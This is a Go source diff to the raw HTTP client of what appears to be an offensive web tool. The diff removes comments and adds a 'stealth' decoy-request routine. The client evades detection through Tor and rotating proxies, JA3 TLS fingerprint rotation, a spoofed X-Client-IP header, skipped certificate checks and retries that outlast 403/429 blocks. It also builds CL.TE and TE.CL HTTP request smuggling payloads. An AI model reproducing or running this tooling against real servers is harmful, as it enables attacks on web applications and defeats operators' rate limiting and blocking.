@@ -38,7 +38,7 @@ type RawClient struct {
 }
 
 func (c *RawClient) dial(ctx context.Context, network, addr string) (net.Conn, error) {
-	// Check Tor Mode
+
 	if c.TorMode {
 		dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
 		if err != nil {
@@ -47,7 +47,6 @@ func (c *RawClient) dial(ctx context.Context, network, addr string) (net.Conn, e
 		return dialer.Dial(network, addr)
 	}
 
-	// Check Rotating Proxies
 	if len(c.Proxies) > 0 {
 		proxyURLStr := c.Proxies[rand.Intn(len(c.Proxies))]
 		pURL, err := url.Parse(proxyURLStr)
@@ -63,7 +62,6 @@ func (c *RawClient) dial(ctx context.Context, network, addr string) (net.Conn, e
 			return dialer.Dial(network, addr)
 		}
 
-		// Basic HTTP Proxy tunneling (TCP Dial to proxy)
 		if pURL.Scheme == "http" || pURL.Scheme == "https" {
 			d := &net.Dialer{}
 			return d.DialContext(ctx, network, pURL.Host)
@@ -73,7 +71,6 @@ func (c *RawClient) dial(ctx context.Context, network, addr string) (net.Conn, e
 		return d.DialContext(ctx, network, pURL.Host)
 	}
 
-	// Direct Connection
 	d := &net.Dialer{}
 	return d.DialContext(ctx, network, addr)
 }
@@ -110,7 +107,6 @@ func (c *RawClient) Do(method, targetURL string, headers map[string]string, body
 		addr := net.JoinHostPort(u.Hostname(), port)
 
 		ctx, cancel := context.WithTimeout(context.Background(), c.Timeout)
-		// We handle cancel() manually per iteration to avoid defer buildup in loop
 
 		conn, err := c.dial(ctx, "tcp", addr)
 
@@ -121,12 +117,12 @@ func (c *RawClient) Do(method, targetURL string, headers map[string]string, body
 				fmt.Fprintf(os.Stderr, "[STEALTH] Network error detected. Entering cooldown for %s...\n", u.Hostname())
 				c.RateLimiter.Block(u.Hostname(), c.CooldownDuration)
 			}
-			time.Sleep(time.Duration(i+1) * time.Second) // Back-off
+			time.Sleep(time.Duration(i+1) * time.Second)
 			continue
 		}
 
 		if u.Scheme == "https" {
-			// Dynamic JA3 rotation using fingerprinter
+
 			profile := GetTLSProfile()
 			uconn := utls.UClient(conn, &utls.Config{
 				ServerName:         u.Hostname(),
@@ -146,13 +142,12 @@ func (c *RawClient) Do(method, targetURL string, headers map[string]string, body
 					fmt.Fprintf(os.Stderr, "[STEALTH] Handshake error detected. Entering cooldown for %s...\n", u.Hostname())
 					c.RateLimiter.Block(u.Hostname(), c.CooldownDuration)
 				}
-				time.Sleep(time.Duration(i+1) * time.Second) // Back-off
+				time.Sleep(time.Duration(i+1) * time.Second)
 				continue
 			}
 			conn = uconn
 		}
 
-		// Construct raw HTTP/1.1 request
 		path := u.RequestURI()
 		if path == "" {
 			path = "/"
@@ -162,7 +157,6 @@ func (c *RawClient) Do(method, targetURL string, headers map[string]string, body
 		reqBuf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path))
 		reqBuf.WriteString(fmt.Sprintf("Host: %s\r\n", u.Host))
 
-		// Priority: 1. Passed headers, 2. Config UAs, 3. Randomized browser UA
 		ua := headers["User-Agent"]
 		if ua == "" {
 			ua = headers["user-agent"]
@@ -195,7 +189,6 @@ func (c *RawClient) Do(method, targetURL string, headers map[string]string, body
 			reqBuf.WriteString("X-Client-IP: 127.0.0.1\r\n")
 		}
 
-		// Cookies from jar
 		if c.Jar != nil {
 			cookies := c.Jar.Cookies(u)
 			if len(cookies) > 0 {
@@ -208,7 +201,7 @@ func (c *RawClient) Do(method, targetURL string, headers map[string]string, body
 		}
 
 		for k, v := range headers {
-			// Skip UA as it's already handled
+
 			if strings.ToLower(k) == "user-agent" {
 				continue
 			}
@@ -229,7 +222,6 @@ func (c *RawClient) Do(method, targetURL string, headers map[string]string, body
 			continue
 		}
 
-		// Parse response
 		resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
 		if err != nil {
 			fmt.Fprintf(os.Stderr, "[DEBUG] Failed to read response (attempt %d): %v\n", i+1, err)
@@ -239,22 +231,33 @@ func (c *RawClient) Do(method, targetURL string, headers map[string]string, body
 		}
 		timing := time.Since(start)
 
-		respBody, err := io.ReadAll(io.LimitReader(resp.Body, 1024*1024)) // 1MB limit
+		if c.RateLimiter != nil {
+			c.RateLimiter.UpdateLatency(u.Hostname(), timing)
+		}
+
+		if c.StealthMode && rand.Float32() < 0.15 {
+			go func(hostURL string, headers map[string]string) {
+				noiseAssets := []string{"/favicon.ico", "/style.css", "/main.js", "/assets/logo.png"}
+				noisePath := noiseAssets[rand.Intn(len(noiseAssets))]
+				noiseURL := hostURL + noisePath
+				c.doNoiseRequest(noiseURL, headers)
+			}(u.Scheme+"://"+u.Host, headers)
+		}
+
+		respBody, err := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
 		resp.Body.Close()
 		conn.Close()
-		cancel() // cancel context after iteration
+		cancel()
 
 		if err != nil {
 			fmt.Fprintf(os.Stderr, "[DEBUG] Failed to read body (attempt %d): %v\n", i+1, err)
 			continue
 		}
 
-		// Update CookieJar
 		if c.Jar != nil {
 			c.Jar.SetCookies(u, resp.Cookies())
 		}
 
-		// Persistence If blocked, rotate and retry
 		if (resp.StatusCode == 403 || resp.StatusCode == 429) && i < maxRetries-1 {
 			fmt.Fprintf(os.Stderr, "[DEBUG] Received status %d (attempt %d). Retrying...\n", resp.StatusCode, i+1)
 			if c.RateLimiter != nil {
@@ -265,7 +268,7 @@ func (c *RawClient) Do(method, targetURL string, headers map[string]string, body
 				fmt.Fprintf(os.Stderr, "[STEALTH] Blocking status %d detected. Entering cooldown for %s...\n", resp.StatusCode, u.Hostname())
 				c.RateLimiter.Block(u.Hostname(), duration)
 			}
-			// Wait before the next retry loop iteration
+
 			time.Sleep(time.Duration(2+rand.Intn(5)) * time.Second)
 			continue
 		}
@@ -293,6 +296,56 @@ func (c *RawClient) Do(method, targetURL string, headers map[string]string, body
 	}
 
 	return nil, fmt.Errorf("request failed after retries")
+}
+
+func (c *RawClient) doNoiseRequest(targetURL string, headers map[string]string) {
+	u, err := url.Parse(targetURL)
+	if err != nil {
+		return
+	}
+	port := u.Port()
+	if port == "" {
+		if u.Scheme == "https" {
+			port = "443"
+		} else {
+			port = "80"
+		}
+	}
+	addr := net.JoinHostPort(u.Hostname(), port)
+	ctx, cancel := context.WithTimeout(context.Background(), c.Timeout)
+	defer cancel()
+
+	conn, err := c.dial(ctx, "tcp", addr)
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+
+	if u.Scheme == "https" {
+		profile := GetTLSProfile()
+		uconn := utls.UClient(conn, &utls.Config{
+			ServerName:         u.Hostname(),
+			InsecureSkipVerify: true,
+			NextProtos:         []string{"http/1.1"},
+		}, profile)
+		if err := ApplyStealthTLS(uconn); err == nil {
+			if uconn.Handshake() == nil {
+				conn = uconn
+			}
+		}
+	}
+
+	var reqBuf bytes.Buffer
+	reqBuf.WriteString(fmt.Sprintf("GET %s HTTP/1.1\r\n", u.RequestURI()))
+	reqBuf.WriteString(fmt.Sprintf("Host: %s\r\n", u.Host))
+	ua := headers["User-Agent"]
+	if ua == "" {
+		ua = getRandomUA()
+	}
+	reqBuf.WriteString(fmt.Sprintf("User-Agent: %s\r\n", ua))
+	reqBuf.WriteString("Accept: */*\r\nConnection: close\r\n\r\n")
+
+	conn.Write(reqBuf.Bytes())
 }
 
 func (c *RawClient) DoSmuggling(method, targetURL, smugglingType string, smuggledData []byte) (*RawResponse, error) {
@@ -354,7 +407,7 @@ func (c *RawClient) DoSmuggling(method, targetURL, smugglingType string, smuggle
 	reqBuf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n")
 
 	if smugglingType == "CL.TE" {
-		// Frontend uses CL, Backend uses TE
+
 		reqBuf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", 4+len(smuggledData)))
 		reqBuf.WriteString("Transfer-Encoding: chunked\r\n")
 		reqBuf.WriteString("\r\n")
@@ -362,7 +415,7 @@ func (c *RawClient) DoSmuggling(method, targetURL, smugglingType string, smuggle
 		reqBuf.WriteString("\r\n")
 		reqBuf.Write(smuggledData)
 	} else if smugglingType == "TE.CL" {
-		// Frontend uses TE, Backend uses CL
+
 		body := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", len(smuggledData), smuggledData)
 		reqBuf.WriteString("Content-Length: 4\r\n")
 		reqBuf.WriteString("Transfer-Encoding: chunked\r\n")
